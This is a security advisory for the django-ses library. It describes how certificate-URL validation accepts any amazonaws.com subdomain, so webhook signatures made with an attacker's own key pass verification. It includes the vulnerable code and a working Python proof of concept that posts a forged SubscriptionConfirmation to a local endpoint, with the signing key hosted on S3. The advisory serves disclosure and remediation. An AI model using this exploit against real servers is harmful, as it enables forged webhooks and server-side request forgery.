# Certificate URL: signature verification exposure

0. TL;DR:

If you were using the default setting or any `amazonaws.com` subdomain for `AWS_SNS_EVENT_CERT_TRUSTED_DOMAINS`,
signature verification webhooks would have allowed someone hosting an arbitrary S3 bucket to send verified webhook
calls to your server.

`django-ses==3.5.0` addresses this by matching the `amazonaws.com` certificate URLs against a known regex, `SES_REGEX_CERT_URL`.

1. Overview

The django_ses library implements a mail backend for Django using AWS Simple Email Service.
The library exports the `SESEventWebhookView` class intended to receive signed requests from AWS
to handle email bounces, subscriptions, etc.
These requests are signed by AWS and are verified by django_ses, however the verification of this
signature was found to be flawed as it allowed users to specify arbitrary public certificates.

2. Description

The [`SESEventWebhookView`](https://github.com/django-ses/django-ses/blob/3a3280382810268476cb6c71d4c66833257db0cc/django_ses/views.py#L379)
view class implements a [`post` handler](https://github.com/django-ses/django-ses/blob/3a3280382810268476cb6c71d4c66833257db0cc/django_ses/views.py#L409)
which receives signed requests. By default (as [noted](https://github.com/django-ses/django-ses/tree/main#full-list-of-settings) in the README)
signature verification is enabled. Signature verification is [performed](https://github.com/django-ses/django-ses/blob/3a3280382810268476cb6c71d4c66833257db0cc/django_ses/views.py#L420)
by the [`verify_event_message`](https://github.com/django-ses/django-ses/blob/3a3280382810268476cb6c71d4c66833257db0cc/django_ses/utils.py#L252)
utility function which uses the `EventMessageVerifier.is_verified` method.

This method obtains the public certificate from a URL passed within the request
(https://github.com/django-ses/django-ses/blob/3a3280382810268476cb6c71d4c66833257db0cc/django_ses/utils.py#L166-L189):

```py
    def _get_cert_url(self):
        """
        Get the signing certificate URL.
        Only accept urls that match the domains set in the
        AWS_SNS_EVENT_CERT_TRUSTED_DOMAINS setting. Sub-domains
        are allowed. i.e. if amazonaws.com is in the trusted domains
        then sns.us-east-1.amazonaws.com will match.
        """
        cert_url = self._data.get("SigningCertURL")
        if not cert_url:
            logger.warning('No signing certificate URL: "%s"', cert_url)
            return None

        if not cert_url.startswith("https://"):
            logger.warning('Untrusted certificate URL: "%s"', cert_url)
            return None

        url_obj = urlparse(cert_url)
        for trusted_domain in settings.EVENT_CERT_DOMAINS:
            parts = trusted_domain.split(".")
            if url_obj.netloc.split(".")[-len(parts) :] == parts:
                return cert_url

        return None
```

Some validation is performed on the certificate URL to ensure it is from a trusted domain. By default, the trusted domains are
(https://github.com/django-ses/django-ses/blob/3a3280382810268476cb6c71d4c66833257db0cc/django_ses/settings.py#L50-L61):

```py
EVENT_CERT_DOMAINS = getattr(
    settings,
    'AWS_SNS_EVENT_CERT_TRUSTED_DOMAINS',
    getattr(
        settings,
        'AWS_SNS_BOUNCE_CERT_TRUSTED_DOMAINS',
        (
            'amazonaws.com',
            'amazon.com',
        )
    )
)
```

However, the validation of the certificate URL allows for arbitrary subdomains. Because anyone can host arbitrary files on a
subdomain of `amazonaws.com` (through hosting an AWS S3 bucket), it is possible to host an arbitrary public certificate which
gets validated and used to verify signatures.

3. Proof of Concept

To test the vulnerability, we can create a Django app and install the library:

```sh
django-admin startproject demo
cd demo
pip3 install django-ses[events]
```

Then, add the SESEventWebhookView view to the `urlpatterns` list in `urls.py`:

```py
from django.urls import path
from django_ses.views import SESEventWebhookView

urlpatterns = [
    path(r'ses/event-webhook/', SESEventWebhookView.as_view(), name='handle-event-webhook')
]
```

Run the server:

```py
python manage.py runserver
```

This runs the server on port 8000. Notice that if you send a POST request to `/ses/event-webhook`
it will fail with "Signature verification failed.":

```sh
curl -X POST http://localhost:8000/ses/event-webhook/ -d '{"Type":"SubscriptionConfirmation", "SubscribeURL": "https://example.com"}'
Signature verification failed.
```

The following Python script implements a proof of concept that signs an arbitrary payload using our attacker-controlled
private key. For convenience of testing, the certificate is available at

https://django-sns-poc.s3.ap-southeast-2.amazonaws.com/publickey.cer

and the private key is available at

https://django-sns-poc.s3.ap-southeast-2.amazonaws.com/private.key

```py
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric import utils
import json
import requests
from base64 import b64encode

# https://github.com/django-ses/django-ses/blob/3a3280382810268476cb6c71d4c66833257db0cc/django_ses/utils.py#L191
def _get_bytes_to_sign(_data):
    """
    Creates the message used for signing SNS notifications.
    This is used to verify the bounce message when it is received.
    """

    # Depending on the message type the fields to add to the message
    # differ so we handle that here.
    msg_type = _data.get('Type')
    if msg_type == 'Notification':
        fields_to_sign = [
            'Message',
            'MessageId',
            'Subject',
            'Timestamp',
            'TopicArn',
            'Type',
        ]
    elif (msg_type == 'SubscriptionConfirmation' or
          msg_type == 'UnsubscribeConfirmation'):
        fields_to_sign = [
            'Message',
            'MessageId',
            'SubscribeURL',
            'Timestamp',
            'Token',
            'TopicArn',
            'Type',
        ]
    else:
        # Unrecognized type
        return None

    bytes_to_sign = []
    for field in fields_to_sign:
        field_value = _data.get(field)
        if not field_value:
            continue

        # Some notification types do not have all fields. Only add fields
        # with values.
        bytes_to_sign.append(f"{field}\n{field_value}\n")

    return "".join(bytes_to_sign).encode()

cert_url = 'https://django-sns-poc.s3.ap-southeast-2.amazonaws.com/publickey.cer'
# privkey available here https://django-sns-poc.s3.ap-southeast-2.amazonaws.com/private.key
privkey = serialization.load_pem_private_key(open('./private.key','rb').read(), password=None)
target_endpoint = 'http://localhost:8000/ses/event-webhook/'

payload = {
    'Type': 'SubscriptionConfirmation',
    'SubscribeURL': 'http://localhost:9999',
}

sign_bytes = _get_bytes_to_sign(payload)
chosen_hash = hashes.SHA1()
hasher = hashes.Hash(chosen_hash)
hasher.update(sign_bytes)
digest = hasher.finalize()
sig = privkey.sign(
    digest,
    padding.PKCS1v15(),
    utils.Prehashed(chosen_hash)
)
payload['SigningCertURL'] = cert_url
payload['Signature'] = b64encode(sig).decode()

r = requests.post(target_endpoint, json=payload)
print(r.status_code) # this is 200, which indicates the message was accepted
```

3. Impact

The impact may vary depending on the context of the application and how bounce events are
handled. Due to the fact that the library suggests that signatures are verified by default,
consumers may consider the data to be trusted and hence use it without appropriate validation.
At the very least, this issue allows a (blind) SSRF vulnerability through the `SubscriptionConfirmation`
event type, however I didn't note this having a very large impact on its own.

4. Credits

Joseph Surin, elttam

5. Recommendations

If you're not setting a value for `AWS_SNS_EVENT_CERT_TRUSTED_DOMAINS`, upgrade to `v3.5.0` and re-test your webhooks to make sure the
signature verification still passes.

If you are setting a value for `AWS_SNS_EVENT_CERT_TRUSTED_DOMAINS` and it contains `amazonaws.com`, set the full domain instead. This
is best practice even if your domain is not `amazonaws.com`, to restrict the possible security risk of other subdomains sending
verifiable webhook calls.

See `django-ses` [Releases](https://github.com/django-ses/django-ses/releases/tag/v3.5.0) for more details about the code changes.
